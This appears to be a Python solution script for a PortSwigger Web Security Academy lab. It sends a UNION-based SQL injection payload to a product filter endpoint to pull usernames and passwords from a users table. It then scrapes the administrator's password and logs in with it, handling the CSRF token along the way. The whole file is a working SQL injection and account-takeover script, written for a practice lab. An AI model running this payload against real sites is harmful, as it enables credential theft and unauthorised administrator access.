#!/usr/bin/env python3
# Lab: SQL injection UNION attack, retrieving data from other tables
# Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_admin_credentials(host):
    url = f'{host}/filter?category={category}'
    payload = f"' UNION (SELECT username, password FROM users)--"
    r = requests.get(f"{url}{payload}", verify=False, proxies=proxies)
    res = r.text
    if 'administrator' not in res:
        return False

    soup = BeautifulSoup(res, 'html.parser')
    creds = soup.find(text="administrator").parent.findNext('td').contents[0]
    return creds


def login(host, password):
    def get_csrf_token(client, uri):
        r = client.get(uri)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']

    client = requests.Session()
    client.proxies = proxies
    client.verify = False

    url = f'{host}/Login'
    csrf = get_csrf_token(client, url)
    if len(csrf) > 0:
        print(f'[+] Found CSRF token')
    else:
        print(f'[-] No CSRF token found')

    payload = {'csrf': csrf,
               'username': 'administrator',
               'password': password}
    r = client.post(url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        return True
    return False


if __name__ == "__main__":
    try:
        host = sys.argv[1].strip().rstrip('/')
        category = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host> <category>')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com Lifestyle')
        sys.exit(-1)

    credentials = find_admin_credentials(host)
    if not credentials:
        print('[-] Could not extract credentials')
        sys.exit(-4)
    print(f'[+] Admin password is {credentials}')

    print(f'[ ] Attempting login')
    if login(host, credentials):
        print(f'[+] Login as adminstrator successful')
    else:
        print(f'[-] Login as adminstrator not successful')
